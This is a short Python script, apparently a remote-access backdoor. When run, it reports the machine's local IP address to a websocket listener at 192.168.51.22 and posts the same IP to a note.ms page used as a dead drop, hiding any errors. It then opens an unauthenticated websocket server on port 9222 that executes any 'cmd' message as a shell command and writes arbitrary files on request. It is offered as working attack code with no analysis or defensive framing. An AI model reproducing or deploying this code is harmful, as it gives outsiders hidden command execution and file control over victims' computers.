import asyncio, os, socket, httpx, random, websockets
hostname = socket.gethostname()
local_ip = socket.gethostbyname(hostname)
nnn='192.168.51.22'
try:
    async def hello():
        async with websockets.connect(f"ws://{nnn}:8222") as websocket:
            message = local_ip
            await websocket.send(message)
            #print(f"Sent message: {message}")
    asyncio.get_event_loop().run_until_complete(hello())
except:
    pass
client=httpx.Client(http2=True)
website="https://note.ms/"  
siteList=['huangqiong114514']
for i in siteList:
    form={"t":local_ip}
    header={"Referer":website+str(i)} #另一个重点：一样的Referer
    client.post(website+str(i),data=form,headers=header)
    #print(i)

async def echo(websocket, path):
    async for message in websocket:
        #print(f"Received message: {message}")
        a = message.split()
        if a[0] == "cmd":
            os.system(" ".join(a[1:]))
        elif a[0] == "file":
            with open(a[1], "w") as file:
                file.writelines(" ".join(a[2:]))
                file.close()
        await websocket.send("Execution succeed!")


start_server = websockets.serve(echo, local_ip, 9222)
asyncio.get_event_loop().run_until_complete(start_server)
asyncio.get_event_loop().run_forever()